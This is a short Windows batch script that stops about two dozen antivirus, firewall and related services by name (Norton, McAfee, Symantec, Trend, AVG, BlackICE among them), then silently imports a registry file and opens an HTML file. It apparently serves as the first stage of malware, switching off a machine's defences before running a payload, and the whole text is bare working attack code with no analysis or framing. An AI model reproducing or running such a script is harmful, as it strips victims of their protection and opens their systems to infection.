   @echo off

   net stop "NAV Alert"
   net stop "NAV Auto-Protect"
   net stop "Norton AntiVirus Auto Protect Service"
   net stop "Norton AntiVirus Auto Protect"
   net stop "Trend ServerProtect"
   net stop "Trend Server Protect"
   net stop "AVG6 Service"
   net stop DefWatch
   net stop AvSynMgr
   net stop McShield
   net stop RemoteRegistry
   net stop "Symantec AntiVirus Client"
   net stop "McAfee.com McShield"
   net stop "McAfee.com VirusScan Online Realtime Engine"
   net stop "Norton Program Scheduler"
   net stop "Norton Antivirus Client"
   net stop "System Event Notification"
   net stop Dcfssvc
   net stop BlackICE
   net stop Messenger
   net stop ptssvc
   net stop ccevtmgr
   net stop navapsvc

   REGEDIT.EXE /S one.reg

   ba.html

   exit
